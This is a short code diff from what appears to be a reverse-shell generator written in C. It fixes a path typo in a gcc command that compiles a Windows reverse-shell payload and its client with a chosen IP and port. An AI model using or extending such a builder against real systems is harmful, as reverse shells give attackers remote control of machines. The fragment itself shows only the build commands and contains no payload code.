@@ -22,7 +22,7 @@ void createShellExecutable(struct Shell shell) {
         printf("Creating reverse shell executable...\n");
         sprintf(shellcmd, "gcc -D PORT=%d -D IP=%s -o output/rshell.exe payloads/reverseshell.c payloads/shellComm.c -lws2_32", shell.port, shell.ip);
         printf("Creating client...\n");
-        sprintf(clientcmd, "gcc -D PORT=%d -D IP=%s -o output/rclient.exe clients/reverseshell_client.c /clients/clientComm.c -lws2_32", shell.port, shell.ip);
+        sprintf(clientcmd, "gcc -D PORT=%d -D IP=%s -o output/rclient.exe clients/reverseshell_client.c clients/clientComm.c -lws2_32", shell.port, shell.ip);
 
     }
     else{
